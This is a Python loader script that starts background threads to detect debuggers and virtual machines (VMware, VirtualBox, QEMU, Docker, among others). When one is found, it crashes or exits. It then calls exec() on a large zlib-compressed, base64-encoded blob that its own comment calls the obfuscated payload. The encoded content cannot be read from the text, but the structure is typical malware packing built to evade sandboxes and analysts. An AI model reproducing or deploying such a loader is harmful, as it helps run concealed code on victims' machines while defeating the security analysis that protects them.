
import zlib, base64, marshal, sys, os, random, time, threading, ctypes

# Anti-debug

# ============ ANTI-DEBUG ============
import ctypes, sys, os, time, threading

def check_debugger():
    try:
        if os.name == 'nt':
            import win32api
            if win32api.IsDebuggerPresent():
                return True
            kernel32 = ctypes.windll.kernel32
            if kernel32.CheckRemoteDebuggerPresent(ctypes.windll.kernel32.GetCurrentProcess(), ctypes.byref(ctypes.c_bool())):
                return True
        start = time.time()
        for _ in range(1000000):
            pass
        if time.time() - start < 0.01:
            return True
        return False
    except:
        return False

def anti_debug_loop():
    while True:
        if check_debugger():
            try:
                ctypes.windll.kernel32.RaiseException(0x80000000, 0, 0, None)
            except:
                os._exit(1)
        time.sleep(1)

threading.Thread(target=anti_debug_loop, daemon=True).start()


# Anti-VM

# ============ ANTI-VM ============
import subprocess, re, time, threading

def check_vm():
    vm_indicators = ['VMware', 'VirtualBox', 'VBox', 'QEMU', 'KVM', 'Xen', 'vbox', 'qemu', 'hyper-v', 'docker']
    try:
        if os.name == 'nt':
            processes = subprocess.check_output('tasklist', shell=True).decode().lower()
            for indicator in vm_indicators:
                if indicator.lower() in processes:
                    return True
        else:
            processes = subprocess.check_output('ps aux', shell=True).decode().lower()
            for indicator in vm_indicators:
                if indicator.lower() in processes:
                    return True
    except:
        pass
    try:
        if os.name == 'nt':
            import wmi
            c = wmi.WMI()
            for item in c.Win32_ComputerSystem():
                if item.Manufacturer and ('VMware' in item.Manufacturer or 'VirtualBox' in item.Manufacturer):
                    return True
    except:
        pass
    return False

def anti_vm_loop():
    while True:
        if check_vm():
            os._exit(1)
        time.sleep(5)

threading.Thread(target=anti_vm_loop, daemon=True).start()


# Esegue il payload offuscato
exec(zlib.decompress(base64.b64decode("""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""")))
